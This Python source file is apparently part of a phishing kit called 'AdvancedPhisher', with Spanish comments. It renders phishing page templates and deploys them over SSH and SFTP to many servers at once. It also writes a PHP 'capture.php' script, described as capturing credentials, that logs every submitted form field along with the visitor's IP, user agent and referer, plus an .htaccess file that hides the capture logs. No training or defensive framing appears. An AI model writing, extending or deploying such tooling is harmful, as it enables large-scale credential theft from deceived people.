#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sistema de Deployment Automático para AdvancedPhisher
Permite desplegar campañas a múltiples dominios y servidores
"""

import os
import json
import time
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import paramiko
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import zipfile
import tempfile
from jinja2 import Template, Environment, FileSystemLoader

@dataclass
class ServerConfig:
    """Configuración de servidor para deployment"""
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: str = ""
    key_file: str = ""
    web_root: str = "/var/www/html"
    domain: str = ""
    ssl_enabled: bool = False
    ssl_cert_path: str = ""
    ssl_key_path: str = ""
    backup_enabled: bool = True
    
@dataclass
class DeploymentConfig:
    """Configuración de deployment"""
    campaign_name: str
    template: str
    target_url: str = ""
    custom_domain: str = ""
    enable_logging: bool = True
    enable_ssl: bool = False
    backup_before_deploy: bool = True
    cleanup_after_deploy: bool = False
    max_concurrent_deployments: int = 5
    deployment_timeout: int = 300  # segundos
    
class DeploymentManager:
    """Gestor de deployments automáticos"""
    
    def __init__(self, project_root: str, config_file: str = "deployment_config.json"):
        self.project_root = Path(project_root)
        self.config_file = self.project_root / "config" / config_file
        self.templates_dir = self.project_root / "templates"
        self.deployments_dir = self.project_root / "deployments"
        self.backups_dir = self.project_root / "backups"
        
        # Crear directorios necesarios
        self.deployments_dir.mkdir(parents=True, exist_ok=True)
        self.backups_dir.mkdir(parents=True, exist_ok=True)
        
        self.servers = self._load_server_configs()
        self.deployment_history = []
        
    def _load_server_configs(self) -> List[ServerConfig]:
        """Cargar configuraciones de servidores"""
        if not self.config_file.exists():
            return []
        
        try:
            with open(self.config_file, 'r', encoding='utf-8') as f:
                config_data = json.load(f)
            
            servers = []
            for server_data in config_data.get('servers', []):
                servers.append(ServerConfig(**server_data))
            
            return servers
        except Exception as e:
            print(f"Error cargando configuración de servidores: {e}")
            return []
    
    def add_server(self, server_config: ServerConfig) -> bool:
        """Añadir nueva configuración de servidor"""
        try:
            # Verificar conectividad
            if not self._test_server_connection(server_config):
                print(f"No se pudo conectar al servidor {server_config.name}")
                return False
            
            self.servers.append(server_config)
            self._save_server_configs()
            print(f"Servidor {server_config.name} añadido exitosamente")
            return True
            
        except Exception as e:
            print(f"Error añadiendo servidor: {e}")
            return False
    
    def _test_server_connection(self, server_config: ServerConfig) -> bool:
        """Probar conexión SSH al servidor"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if server_config.key_file:
                ssh.connect(
                    hostname=server_config.host,
                    port=server_config.port,
                    username=server_config.username,
                    key_filename=server_config.key_file,
                    timeout=10
                )
            else:
                ssh.connect(
                    hostname=server_config.host,
                    port=server_config.port,
                    username=server_config.username,
                    password=server_config.password,
                    timeout=10
                )
            
            # Ejecutar comando de prueba
            stdin, stdout, stderr = ssh.exec_command('echo "test"')
            result = stdout.read().decode().strip()
            
            ssh.close()
            return result == "test"
            
        except Exception as e:
            print(f"Error probando conexión: {e}")
            return False
    
    def _save_server_configs(self):
        """Guardar configuraciones de servidores"""
        try:
            config_data = {
                'servers': [asdict(server) for server in self.servers],
                'last_updated': datetime.now().isoformat()
            }
            
            self.config_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config_data, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            print(f"Error guardando configuración: {e}")
    
    def prepare_deployment_package(self, deployment_config: DeploymentConfig) -> str:
        """Preparar paquete de deployment"""
        try:
            # Crear directorio temporal para el paquete
            package_dir = self.deployments_dir / f"{deployment_config.campaign_name}_{int(time.time())}"
            package_dir.mkdir(parents=True, exist_ok=True)
            
            # Copiar template base
            template_source = self.templates_dir / f"{deployment_config.template}.html"
            if not template_source.exists():
                raise FileNotFoundError(f"Template {deployment_config.template} no encontrado")
            
            # Procesar template con configuración personalizada
            processed_template = self._process_template(
                template_source, 
                deployment_config
            )
            
            # Guardar template procesado
            main_file = package_dir / "index.html"
            with open(main_file, 'w', encoding='utf-8') as f:
                f.write(processed_template)
            
            # Copiar archivos estáticos necesarios
            self._copy_static_files(package_dir, deployment_config.template)
            
            # Crear archivo de configuración PHP para captura
            self._create_capture_script(package_dir, deployment_config)
            
            # Crear archivo .htaccess si es necesario
            self._create_htaccess(package_dir, deployment_config)
            
            # Crear archivo de configuración
            config_file = package_dir / "config.json"
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(asdict(deployment_config), f, indent=2, ensure_ascii=False)
            
            return str(package_dir)
            
        except Exception as e:
            raise Exception(f"Error preparando paquete de deployment: {e}")
    
    def _process_template(self, template_path: Path, config: DeploymentConfig) -> str:
        """Procesar template con configuración personalizada"""
        try:
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            
            # Usar Jinja2 para procesar el template
            template = Template(template_content)
            
            # Variables disponibles en el template
            template_vars = {
                'campaign_name': config.campaign_name,
                'target_url': config.target_url,
                'custom_domain': config.custom_domain,
                'timestamp': datetime.now().isoformat(),
                'enable_logging': config.enable_logging
            }
            
            return template.render(**template_vars)
            
        except Exception as e:
            raise Exception(f"Error procesando template: {e}")
    
    def _copy_static_files(self, package_dir: Path, template_name: str):
        """Copiar archivos estáticos necesarios"""
        try:
            # Copiar archivos CSS, JS, imágenes si existen
            static_dirs = ['css', 'js', 'images', 'assets']
            
            for static_dir in static_dirs:
                source_dir = self.templates_dir / static_dir
                if source_dir.exists():
                    dest_dir = package_dir / static_dir
                    shutil.copytree(source_dir, dest_dir, dirs_exist_ok=True)
            
            # Copiar archivos específicos del template
            template_assets = self.templates_dir / f"{template_name}_assets"
            if template_assets.exists():
                for item in template_assets.iterdir():
                    if item.is_file():
                        shutil.copy2(item, package_dir / item.name)
                    elif item.is_dir():
                        shutil.copytree(item, package_dir / item.name, dirs_exist_ok=True)
                        
        except Exception as e:
            print(f"Advertencia: Error copiando archivos estáticos: {e}")
    
    def _create_capture_script(self, package_dir: Path, config: DeploymentConfig):
        """Crear script PHP para captura de credenciales"""
        php_script = '''
<?php
// Script de captura para AdvancedPhisher
// Generado automáticamente

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = [];
    
    // Capturar datos del formulario
    foreach ($_POST as $key => $value) {
        $data[$key] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
    
    // Información adicional
    $data['timestamp'] = date('Y-m-d H:i:s');
    $data['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $data['referer'] = $_SERVER['HTTP_REFERER'] ?? 'unknown';
    $data['campaign'] = '{{ campaign_name }}';
    
    // Guardar en archivo log
    $log_file = 'captures.log';
    $log_entry = json_encode($data) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // Respuesta de éxito
    echo json_encode(['status' => 'success', 'message' => 'Datos recibidos']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Método no permitido']);
}
?>
'''
        
        # Procesar el script PHP con la configuración
        template = Template(php_script)
        processed_script = template.render(campaign_name=config.campaign_name)
        
        # Guardar script
        capture_file = package_dir / "capture.php"
        with open(capture_file, 'w', encoding='utf-8') as f:
            f.write(processed_script)
    
    def _create_htaccess(self, package_dir: Path, config: DeploymentConfig):
        """Crear archivo .htaccess para configuración del servidor"""
        htaccess_content = '''
# Configuración AdvancedPhisher
RewriteEngine On

# Redirigir a HTTPS si está habilitado SSL
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# Ocultar archivos de configuración
<Files "config.json">
    Order allow,deny
    Deny from all
</Files>

<Files "*.log">
    Order allow,deny
    Deny from all
</Files>

# Configuración de headers de seguridad
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options SAMEORIGIN
Header always set X-XSS-Protection "1; mode=block"

# Configuración de cache
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType text/css "access plus 1 month"
    ExpiresByType application/javascript "access plus 1 month"
    ExpiresByType image/png "access plus 1 month"
    ExpiresByType image/jpg "access plus 1 month"
    ExpiresByType image/jpeg "access plus 1 month"
    ExpiresByType image/gif "access plus 1 month"
</IfModule>
'''
        
        htaccess_file = package_dir / ".htaccess"
        with open(htaccess_file, 'w', encoding='utf-8') as f:
            f.write(htaccess_content)
    
    def deploy_to_server(self, server_config: ServerConfig, package_path: str, 
                        deployment_config: DeploymentConfig) -> Dict[str, Any]:
        """Desplegar paquete a un servidor específico"""
        deployment_result = {
            'server': server_config.name,
            'status': 'failed',
            'message': '',
            'timestamp': datetime.now().isoformat(),
            'backup_created': False,
            'files_deployed': 0
        }
        
        ssh = None
        sftp = None
        
        try:
            # Establecer conexión SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if server_config.key_file:
                ssh.connect(
                    hostname=server_config.host,
                    port=server_config.port,
                    username=server_config.username,
                    key_filename=server_config.key_file,
                    timeout=deployment_config.deployment_timeout
                )
            else:
                ssh.connect(
                    hostname=server_config.host,
                    port=server_config.port,
                    username=server_config.username,
                    password=server_config.password,
                    timeout=deployment_config.deployment_timeout
                )
            
            sftp = ssh.open_sftp()
            
            # Crear backup si está habilitado
            if deployment_config.backup_before_deploy and server_config.backup_enabled:
                backup_result = self._create_remote_backup(ssh, sftp, server_config)
                deployment_result['backup_created'] = backup_result
            
            # Desplegar archivos
            files_deployed = self._deploy_files(sftp, package_path, server_config.web_root)
            deployment_result['files_deployed'] = files_deployed
            
            # Configurar permisos
            self._set_file_permissions(ssh, server_config.web_root)
            
            # Verificar deployment
            if self._verify_deployment(server_config):
                deployment_result['status'] = 'success'
                deployment_result['message'] = f'Deployment exitoso. {files_deployed} archivos desplegados.'
            else:
                deployment_result['message'] = 'Deployment completado pero la verificación falló'
            
        except Exception as e:
            deployment_result['message'] = f'Error durante deployment: {str(e)}'
            
        finally:
            if sftp:
                sftp.close()
            if ssh:
                ssh.close()
        
        return deployment_result
    
    def _create_remote_backup(self, ssh, sftp, server_config: ServerConfig) -> bool:
        """Crear backup remoto antes del deployment"""
        try:
            backup_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
            backup_path = f"/tmp/{backup_name}"
            
            # Crear backup comprimido
            backup_cmd = f"tar -czf {backup_path} -C {server_config.web_root} ."
            stdin, stdout, stderr = ssh.exec_command(backup_cmd)
            
            if stdout.channel.recv_exit_status() == 0:
                print(f"Backup creado: {backup_path}")
                return True
            else:
                print(f"Error creando backup: {stderr.read().decode()}")
                return False
                
        except Exception as e:
            print(f"Error en backup remoto: {e}")
            return False
    
    def _deploy_files(self, sftp, package_path: str, web_root: str) -> int:
        """Desplegar archivos al servidor"""
        files_deployed = 0
        package_dir = Path(package_path)
        
        try:
            # Asegurar que el directorio web existe
            try:
                sftp.stat(web_root)
            except FileNotFoundError:
                sftp.mkdir(web_root)
            
            # Desplegar archivos recursivamente
            for item in package_dir.rglob('*'):
                if item.is_file():
                    relative_path = item.relative_to(package_dir)
                    remote_path = f"{web_root}/{relative_path.as_posix()}"
                    
                    # Crear directorios padre si no existen
                    remote_dir = '/'.join(remote_path.split('/')[:-1])
                    try:
                        sftp.stat(remote_dir)
                    except FileNotFoundError:
                        self._create_remote_dirs(sftp, remote_dir)
                    
                    # Subir archivo
                    sftp.put(str(item), remote_path)
                    files_deployed += 1
                    print(f"Desplegado: {relative_path}")
            
            return files_deployed
            
        except Exception as e:
            raise Exception(f"Error desplegando archivos: {e}")
    
    def _create_remote_dirs(self, sftp, path: str):
        """Crear directorios remotos recursivamente"""
        dirs = path.split('/')
        current_path = ''
        
        for dir_name in dirs:
            if dir_name:
                current_path += f'/{dir_name}'
                try:
                    sftp.stat(current_path)
                except FileNotFoundError:
                    sftp.mkdir(current_path)
    
    def _set_file_permissions(self, ssh, web_root: str):
        """Configurar permisos de archivos"""
        try:
            # Establecer permisos apropiados
            commands = [
                f"find {web_root} -type f -name '*.html' -exec chmod 644 {{}} \;",
                f"find {web_root} -type f -name '*.php' -exec chmod 644 {{}} \;",
                f"find {web_root} -type f -name '*.css' -exec chmod 644 {{}} \;",
                f"find {web_root} -type f -name '*.js' -exec chmod 644 {{}} \;",
                f"find {web_root} -type d -exec chmod 755 {{}} \;",
                f"chmod 666 {web_root}/*.log 2>/dev/null || true"
            ]
            
            for cmd in commands:
                ssh.exec_command(cmd)
                
        except Exception as e:
            print(f"Advertencia: Error configurando permisos: {e}")
    
    def _verify_deployment(self, server_config: ServerConfig) -> bool:
        """Verificar que el deployment fue exitoso"""
        try:
            if not server_config.domain:
                return True  # No se puede verificar sin dominio
            
            protocol = 'https' if server_config.ssl_enabled else 'http'
            url = f"{protocol}://{server_config.domain}"
            
            response = requests.get(url, timeout=10, verify=False)
            return response.status_code == 200
            
        except Exception as e:
            print(f"Error verificando deployment: {e}")
            return False
    
    def deploy_to_multiple_servers(self, deployment_config: DeploymentConfig, 
                                 server_names: List[str] = None) -> List[Dict[str, Any]]:
        """Desplegar a múltiples servidores concurrentemente"""
        try:
            # Preparar paquete de deployment
            package_path = self.prepare_deployment_package(deployment_config)
            
            # Filtrar servidores si se especificaron nombres
            target_servers = self.servers
            if server_names:
                target_servers = [s for s in self.servers if s.name in server_names]
            
            if not target_servers:
                raise Exception("No se encontraron servidores válidos para deployment")
            
            # Desplegar concurrentemente
            results = []
            with ThreadPoolExecutor(max_workers=deployment_config.max_concurrent_deployments) as executor:
                future_to_server = {
                    executor.submit(self.deploy_to_server, server, package_path, deployment_config): server
                    for server in target_servers
                }
                
                for future in as_completed(future_to_server):
                    server = future_to_server[future]
                    try:
                        result = future.result()
                        results.append(result)
                        print(f"Deployment a {server.name}: {result['status']}")
                    except Exception as e:
                        results.append({
                            'server': server.name,
                            'status': 'failed',
                            'message': f'Error en deployment: {str(e)}',
                            'timestamp': datetime.now().isoformat()
                        })
            
            # Guardar historial de deployment
            deployment_record = {
                'campaign_name': deployment_config.campaign_name,
                'template': deployment_config.template,
                'timestamp': datetime.now().isoformat(),
                'servers': len(target_servers),
                'successful': len([r for r in results if r['status'] == 'success']),
                'failed': len([r for r in results if r['status'] == 'failed']),
                'results': results
            }
            
            self.deployment_history.append(deployment_record)
            self._save_deployment_history()
            
            # Limpiar archivos temporales si está habilitado
            if deployment_config.cleanup_after_deploy:
                shutil.rmtree(package_path, ignore_errors=True)
            
            return results
            
        except Exception as e:
            raise Exception(f"Error en deployment múltiple: {e}")
    
    def _save_deployment_history(self):
        """Guardar historial de deployments"""
        try:
            history_file = self.project_root / "deployment_history.json"
            with open(history_file, 'w', encoding='utf-8') as f:
                json.dump(self.deployment_history, f, indent=2, ensure_ascii=False, default=str)
        except Exception as e:
            print(f"Error guardando historial: {e}")
    
    def get_deployment_status(self) -> Dict[str, Any]:
        """Obtener estado actual de deployments"""
        return {
            'total_servers': len(self.servers),
            'active_servers': len([s for s in self.servers if self._test_server_connection(s)]),
            'total_deployments': len(self.deployment_history),
            'recent_deployments': self.deployment_history[-5:] if self.deployment_history else [],
            'server_list': [{
                'name': s.name,
                'host': s.host,
                'domain': s.domain,
                'ssl_enabled': s.ssl_enabled
            } for s in self.servers]
        }
    
    def rollback_deployment(self, server_name: str, backup_name: str) -> bool:
        """Hacer rollback de un deployment usando backup"""
        try:
            server = next((s for s in self.servers if s.name == server_name), None)
            if not server:
                raise Exception(f"Servidor {server_name} no encontrado")
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if server.key_file:
                ssh.connect(
                    hostname=server.host,
                    port=server.port,
                    username=server.username,
                    key_filename=server.key_file
                )
            else:
                ssh.connect(
                    hostname=server.host,
                    port=server.port,
                    username=server.username,
                    password=server.password
                )
            
            # Restaurar backup
            backup_path = f"/tmp/{backup_name}"
            restore_cmd = f"tar -xzf {backup_path} -C {server.web_root}"
            
            stdin, stdout, stderr = ssh.exec_command(restore_cmd)
            exit_status = stdout.channel.recv_exit_status()
            
            ssh.close()
            
            if exit_status == 0:
                print(f"Rollback exitoso en {server_name}")
                return True
            else:
                print(f"Error en rollback: {stderr.read().decode()}")
                return False
                
        except Exception as e:
            print(f"Error en rollback: {e}")
            return False

# Función de conveniencia para deployment rápido
def quick_deploy(campaign_name: str, template: str, server_names: List[str] = None, 
                target_url: str = "", project_root: str = ".") -> List[Dict[str, Any]]:
    """Función de conveniencia para deployment rápido"""
    deployment_config = DeploymentConfig(
        campaign_name=campaign_name,
        template=template,
        target_url=target_url
    )
    
    manager = DeploymentManager(project_root)
    return manager.deploy_to_multiple_servers(deployment_config, server_names)